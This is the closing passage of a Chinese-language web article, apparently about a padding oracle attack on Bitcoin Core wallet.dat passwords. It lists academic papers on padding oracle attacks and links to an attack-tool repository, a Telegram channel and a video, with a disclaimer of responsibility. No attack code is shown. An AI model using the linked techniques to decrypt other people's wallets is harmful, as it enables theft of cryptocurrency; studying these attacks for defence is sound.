<li><strong>[2]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Efficient_Padding_Oracle_Attacks_on_Cryptographic_Hardware_Romain_Bardou_Riccardo_Focardi_Yusuke_Kawamoto_Lorenzo_Simionato_Graham_Steel__Joe_Kai_Tsay.pdf" target="_blank" rel="noreferrer noopener">針對加密硬體的高效填充預言機攻擊<strong>（Romain Bardou、Riccardo Focardi、Yusuke Kawamoto、Lorenzo Simionato、Graham Steel、Joe-Kai Tsay）</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[3]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">CBC 填充應用程式到 SSL、IPSEC、WTLS 引發的安全缺陷</a></em><strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">…（Serge Vaudenay）</a></em></strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[4]&nbsp;</strong><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_on_PKCS_Can_Non_standard_Implementation_Act_as_a_Shelter_Si_Gao_Hua_Chen_and_Limin_Fan.pdf" target="_blank" rel="noreferrer noopener"><em>Padding Oracle 對 PKCS#1 v1.5 的攻擊：非標準實現能否充當庇護所<strong>（Si Gau、Hua Chen 和 Limin Fan）</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[5]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Attacks_and_Defenses_Dr_Falko_Strenzke.pdf" target="_blank" rel="noreferrer noopener">攻擊與防禦<strong>（Falko Strenzke 博士）[2020]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[6]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/CBC_padding_oracle_attacks.pdf" target="_blank" rel="noreferrer noopener">CBC 填充預言機攻擊<strong>[2023]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[7]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Fun_with_Padding_Oracles_Justin_Clarke_OWASP_London_Chapter.pdf" target="_blank" rel="noreferrer noopener">填充預言機的樂趣<strong>(Justin Clarke) [OWASP 倫敦分會]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[8]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_on_RSA_Riccardo_Focardi.pdf" target="_blank" rel="noreferrer noopener">RSA 上的實用 Padding Oracle 攻擊<strong>(Riccardo Focardi)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[9]&nbsp;</strong><a href="https://cryptodeep.ru/doc/The_Padding_Oracle_Attack_Fionn_Fitzmaurice_2018.pdf" target="_blank" rel="noreferrer noopener"><em>Padding Oracle 攻擊<strong>(Fionn Fitzmaurice) [2018]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[10]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Exploiting_CBC_Padding_Oracles_Eli_Sohl_2021.pdf" target="_blank" rel="noreferrer noopener">利用 CBC 填充預言機<strong>Eli Sohl [2021]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;11&nbsp;]</strong>&nbsp;<a href="https://cryptodeep.ru/doc/Partitioning_Oracle_Attacks_Julia_Len_Paul_Grubbs_Thomas_Ristenpart_Cornell_Tech.pdf" target="_blank" rel="noreferrer noopener"><em>劃分 Oracle 攻擊<strong>（Julia Len、Paul Grubbs、Thomas Ristenpart）[康乃爾科技]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;12&nbsp;]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Padding_and_CBC_Mode_y_David_Wagner_and_Bruce_Schneider_1997.pdf" target="_blank" rel="noreferrer noopener">填充與 CBC 模式<strong>（David Wagner 和 Bruce Schneider）[1997]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;13&nbsp;]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attacks_methodology.pdf" target="_blank" rel="noreferrer noopener">Padding Oracle 攻擊<strong>（方法論）</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;14&nbsp;]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_Introduction_Packet_Encryption_Mode_CTF_Events.pdf" target="_blank" rel="noreferrer noopener">Padding Oracle Attack&nbsp;<strong>（介紹包加密模式CTF事件）</strong></a></em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>本資料是為&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>入口網站創建的&nbsp;，旨在確保資料和橢圓曲線加密&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1的財務安全，防止</a><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">比特幣加密</a>貨幣&nbsp;中的&nbsp;弱<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;簽章&nbsp;。該軟體的創建者不對材料的使用負責。<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">來源</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">電報：https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/0aCfT-kCRlw" target="_blank" rel="noreferrer noopener">影片素材：https://youtu.be/0aCfT-kCRlw</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/padding-oracle-attack-on-wallet-dat" target="_blank" rel="noreferrer noopener">來源：https://cryptodeep.ru/padding-oracle-attack-on-wallet-dat</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4252} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/048-1024x576.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4252"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">密碼分析</a></p>
<!-- /wp:paragraph -->
